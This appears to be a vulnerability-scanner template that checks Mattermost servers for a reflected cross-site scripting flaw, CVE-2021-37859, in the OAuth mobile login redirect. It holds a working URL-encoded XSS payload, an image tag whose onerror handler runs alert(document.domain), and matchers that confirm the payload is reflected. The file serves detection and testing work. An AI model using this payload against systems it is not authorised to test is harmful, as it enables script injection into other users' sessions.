id: CVE-2021-37859

info:
  name: Mattermost XSS
  author: 0x_Akoko
  severity: medium
  description: reflected Cross-Site Scripting (XSS) via the OAuth flow
  tags: cve,cve2021,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src%3D%22%22%20onerror%3D%22alert(document.domain)%22%3E"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "<img src= onerror=alert(document.domain)>"
        part: body
        condition: and

      - type: word
        words:
          - "text/html"
        part: header
